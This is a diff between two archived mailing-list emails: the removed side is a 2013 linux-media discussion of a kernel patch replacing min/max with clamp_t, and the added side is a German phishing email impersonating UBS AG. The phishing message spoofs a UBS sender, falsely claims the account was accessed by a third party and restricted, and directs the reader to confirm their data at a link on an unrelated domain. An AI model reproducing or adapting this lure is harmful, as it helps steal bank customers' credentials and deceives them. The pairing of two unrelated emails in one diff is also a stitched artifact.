@@ -1,51 +1,45 @@
 Return-path: <linux-media-owner@vger.kernel.org>
-Received: from mail-ob0-f172.google.com ([209.85.214.172]:41448 "EHLO
-	mail-ob0-f172.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753127Ab3GYHrh (ORCPT
+Received: from mail5.atlantis.sk ([92.240.247.55]:38924 "EHLO
+	mail5.atlantis.sk" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1750957Ab3GXOkv (ORCPT
 	<rfc822;linux-media@vger.kernel.org>);
-	Thu, 25 Jul 2013 03:47:37 -0400
-Received: by mail-ob0-f172.google.com with SMTP id f8so801824obp.17
-        for <linux-media@vger.kernel.org>; Thu, 25 Jul 2013 00:47:36 -0700 (PDT)
+	Wed, 24 Jul 2013 10:40:51 -0400
+Cc: recipient list not shown:;
+Message-ID: <a1425e677847c7be3b297f9beeb6cbbe.squirrel@mail5.atlantis.sk>
+Date: Wed, 24 Jul 2013 13:51:31 +0200 (CEST)
+Subject: Benachrichtigung von UBS AG
+From: "UBS AG" <info@ubs.ch>
 MIME-Version: 1.0
-In-Reply-To: <20130724155538.GF12281@valkosipuli.retiisi.org.uk>
-References: <1374679278-9856-1-git-send-email-andriy.shevchenko@linux.intel.com>
-	<20130724154536.GE12281@valkosipuli.retiisi.org.uk>
-	<CAHp75Vdp43x=SMYwpxWLoS0f7ku+qmZoAhW8Pao1p7DDGXcCPg@mail.gmail.com>
-	<20130724155538.GF12281@valkosipuli.retiisi.org.uk>
-Date: Thu, 25 Jul 2013 10:47:36 +0300
-Message-ID: <CAHp75VeGYW5GKXRzg1dtPnmV+xwpBNU7RO_+5Uhi8iW07Hr62Q@mail.gmail.com>
-Subject: Re: [PATCH] smiapp: re-use clamp_t instead of min(..., max(...))
-From: Andy Shevchenko <andy.shevchenko@gmail.com>
-To: Sakari Ailus <sakari.ailus@iki.fi>
-Cc: Andy Shevchenko <andriy.shevchenko@linux.intel.com>,
-	linux-media@vger.kernel.org
-Content-Type: text/plain; charset=UTF-8
+Content-Type: text/plain;charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+To: unlisted-recipients:; (no To-header on input)@casper.infradead.org
 Sender: linux-media-owner@vger.kernel.org
 List-ID: <linux-media.vger.kernel.org>
 
-On Wed, Jul 24, 2013 at 6:55 PM, Sakari Ailus <sakari.ailus@iki.fi> wrote:
-> On Wed, Jul 24, 2013 at 06:49:24PM +0300, Andy Shevchenko wrote:
->> On Wed, Jul 24, 2013 at 6:45 PM, Sakari Ailus <sakari.ailus@iki.fi> wrote:
->>
->> []
->>
->> >> +     max_m = clamp_t(u32, max_m, sensor->limits[SMIAPP_LIMIT_SCALER_M_MIN],
->> >> +                     sensor->limits[SMIAPP_LIMIT_SCALER_M_MAX]);
->> >
->> > Do you need clamp_t()? Wouldn't plain clamp() do?
->>
->> The *_t variants are preferred due to they are faster (no type checking).
->>
->> > I can change it if you're ok with that.
->>
->> I don't know why you may choose clamp instead of clamp_t here. Are you
->> going to change variable types?
->
-> Probably not. But clamp() would serve as a sanity check vs. clamp_t() which
-> just does the thing. I'd prefer clamp()
 
-You may adjust original patch if you want.
 
---
-With Best Regards,
-Andy Shevchenko
+
+Sehr geehrter Kunde,
+
+Kürzlich zeigen unsere Aufzeichnungen, dass Ihr UBS-Konto möglich durch
+einen Dritten unbefugten Zutritt.
+
+Die Sicherheit Ihres Kontos ist unser wichtigstes Anliegen, deshalb haben
+wir beschlossen, den Zugang zu Ihrem Konto vorübergehend zu begrenzen. Für
+den vollen Zugang zu Ihrem Konto, Sie müssen Ihre Daten wiederherstellen
+und bestätigen Sie Ihr Konto über diesen
+Link:http://comhealtyfoodupdate.com/images/Index.do.htm
+
+Sobald Ihre Angaben überprüft und bestätigt, erhalten Sie eine Nachricht
+von uns erhalten und wird Ihr Konto komplett zugreifen wiederhergestellt.
+
+Wir danken Ihnen für Ihre Kooperation.
+
+Mit freundlichen Grüßen,
+UBS AG
+Bahnhofstrasse 45 8001 Zurich
+
+UBS AG    CH-8098 Zurich
+SWIFT (BIC):    UBSWCHZH
+BIC: UBSWCHZH80A
+
